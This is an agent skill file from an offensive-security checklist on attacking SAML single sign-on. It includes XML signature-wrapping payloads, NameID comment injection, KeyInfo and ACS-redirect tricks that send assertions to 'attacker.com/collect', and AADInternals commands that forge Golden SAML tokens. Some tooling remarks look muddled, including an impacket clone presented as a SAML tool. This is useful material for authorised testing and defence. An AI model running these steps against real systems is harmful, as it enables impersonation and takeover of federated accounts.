---
name: offensive-saml-attacks
description: "SAML (Security Assertion Markup Language) attack methodology — XML signature wrapping (XSW1-XSW8), comment injection in NameID, KeyInfo confusion, signature exclusion, AssertionConsumer redirect abuse, IdP-initiated SSO replay, Golden SAML (token-signing certificate theft from compromised ADFS / federation server), and post-exploitation pivots into SaaS platforms (Salesforce, Microsoft 365, AWS, etc.). Use when the application uses SAML SSO for authentication — common in enterprise SaaS, federation-protected internal apps, and SP-IdP relationships."
---

# SAML Attacks

SAML's XML-based message format and signature scheme produce a long history of crypto-on-XML bugs. The standard fixes have been published since 2012; many production deployments still ship the buggy patterns.

## Quick Workflow

1. Capture a legitimate SAML response (Burp / SAML Tracer browser extension)
2. Inspect for trust assumptions (which assertions are signed, where signatures land)
3. Try XSW variants until one is accepted
4. Comment / KeyInfo / signature-exclusion attacks in turn
5. If nothing on the SP, target the IdP or token-signing key

---

## SAML Refresher

```
User → SP: GET /protected
SP → User: Redirect to IdP with AuthnRequest
User → IdP: Auth (creds, MFA)
IdP → User: SAML Response signed with IdP's private key, attribute statements
User → SP: POST AssertionConsumerService /acs with Response
SP: verify signature, extract NameID + attributes, log user in
```

Trust assumption: SP trusts whatever the IdP signs. Attacks subvert that trust.

## XML Signature Wrapping (XSW)

Move or duplicate signed elements within the response, exploiting parser/verifier disagreement on which element the signature actually protects.

### XSW1: Signature wraps malicious assertion

```xml
<Response>
  <Signature>...</Signature>
  <Assertion ID="signed-id">     <!-- legit signed assertion (legit user) -->
    <Subject>victim</Subject>
  </Assertion>
  <Assertion ID="evil-id">       <!-- attacker assertion -->
    <Subject>admin</Subject>
  </Assertion>
</Response>
```

If the SP's `verify` finds the signature reference matches the original Assertion (by ID), it validates. Then the SP's processor reads the second Assertion's contents (parser preference for last sibling, etc.).

### XSW Variants

| Variant | Mechanism |
|---|---|
| XSW1 | Move signature outside its assertion; add evil unsigned assertion |
| XSW2 | Wrap evil assertion in tag containing legit + signature |
| XSW3 | Add evil assertion as sibling of signed assertion |
| XSW4 | Place evil assertion inside signed assertion as child |
| XSW5 | Move signature into evil assertion |
| XSW6 | Combine XSW3 + XSW2 wrapping |
| XSW7 | Add Extensions tag containing evil assertion |
| XSW8 | Multiple combinations |

### Tooling

```bash
# SAMLRaider (Burp extension) — automates all 8 XSW variants
# Install via BApp Store; right-click captured SAML → Send to SAMLRaider

# Or manually with python-saml-attack
git clone https://github.com/SecureAuthCorp/impacket
# (impacket has SAML-related tools)
```

## Comment Injection in NameID

Some SAML processors strip XML comments before passing to user-resolution code, but others don't. Inject a comment:

```xml
<NameID>victim<!---->@target.com</NameID>
```

A processor stripping comments sees `victim@target.com`. One that doesn't sees `victim<!---->@target.com`. If the SP looks up the user by email and the IdP signed it as a single email, the SP might lookup the literal string and fail — or it might lookup `victim` as the user.

```xml
<NameID>admin<!--@-->user.com</NameID>
```

If the SP normalizes by stripping comments, this becomes `admin@user.com` — SP signs a victim user but logs in as admin.

CVE-2018-1000537 and others — multiple SAML libraries had this bug.

## KeyInfo Confusion

`<KeyInfo>` element specifies which key to use for verification. If the SP accepts `KeyInfo` from the response itself (rather than from a pre-configured trusted key):

```xml
<Signature>
  <KeyInfo>
    <X509Data>
      <X509Certificate>ATTACKER_SELF_SIGNED_CERT</X509Certificate>
    </X509Data>
  </KeyInfo>
  ... signature using attacker's private key ...
</Signature>
```

Attacker signs with their own key; SP verifies with that same key from the message → validates.

The SP must be configured with a fixed trusted IdP cert/fingerprint to defeat this. Many implementations skip this validation.

## Signature Exclusion

Some legacy SAML libraries treat missing `<Signature>` as "valid" (no error). Removing the signature element entirely → response with no signature → accepted.

Test by sending unsigned response and observing whether SP accepts.

## Assertion Replay

```bash
# Capture victim's valid SAML response
# Replay within validity window (default 5 minutes)
# Combine with NotBefore / NotOnOrAfter manipulation if SP doesn't enforce
```

If the SP doesn't track used assertions or doesn't enforce the validity window strictly, replay works.

## AssertionConsumer Redirect

The `AssertionConsumerServiceURL` in AuthnRequest specifies where the IdP sends the response. If the IdP doesn't validate against a list of registered URLs:

```
Set ACS URL = https://attacker.com/collect
IdP sends signed assertion to attacker's collector
Attacker now has signed assertion for victim user
```

Then post the captured assertion to the legitimate SP's ACS endpoint → log in as victim.

## Golden SAML

When you compromise the IdP itself (specifically the token-signing cert), you can forge **any** SAML assertion and login as anyone to any SP that trusts the IdP.

### Token-Signing Cert Theft

ADFS stores the token-signing cert in:
- DKM (Data Key Manager) container in AD
- Local file system / certificate store on ADFS server
- Backup files (often with weaker ACL than the live cert)

### Forge SAML

```powershell
# AADInternals
Get-AADIntADFSTokenSigningCertificate -ServerName adfs.target.com -CertOnly | \
  Export-AADIntADFSCertificate -OutputFolder ./

New-AADIntSAMLToken -ImmutableID 'a==' \
  -Issuer 'http://adfs.target.com/adfs/services/trust' \
  -PfxFileName 'token-signing.pfx' \
  -SAMLNameID 'admin@target.com'
```

The forged token works against any SP federated with that ADFS instance — Office 365, Salesforce, AWS, internal apps.

### Detection of Golden SAML

- Sign-in events without corresponding ADFS log
- Assertions issued from unexpected source IPs
- Microsoft 365: Azure AD Audit "Sign-in" events with `IsCompliant: True` but no MFA correlation

Hard to detect without ADFS-side log forwarding.

## Engagement Cheatsheet

```bash
# 1. Capture legitimate SAML flow
# Burp Proxy → SAML Tracer extension

# 2. SAMLRaider — try XSW variants
# Right-click SAML in Burp → SAML Raider → XSW1 through XSW8

# 3. Comment injection in NameID
# Modify NameID to victim<!---->@target.com

# 4. Signature exclusion
# Remove <Signature> entirely

# 5. KeyInfo override
# Inject attacker cert into <KeyInfo>

# 6. Assertion replay
# Capture legit response; replay within validity window

# 7. ACS URL injection
# Modify AuthnRequest's AssertionConsumerServiceURL → attacker URL

# 8. If IdP/ADFS compromise possible: Golden SAML
```

## Reporting

For each finding:
- Specific SP and IdP versions / products
- Exact XSW variant or other technique
- Captured request + injected version
- The user account "logged in as"
- Library/product responsible (so vendor patch is identifiable)

---

## Key References

- "On Breaking SAML" (Somorovsky et al, 2012) — XSW canonical paper
- SAMLRaider: github.com/CompassSecurity/SAMLRaider
- "Golden SAML" (Sygnia) — research on ADFS-based attacks
- AADInternals: aadinternals.com
- OASIS SAML 2.0 specification
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/saml.md
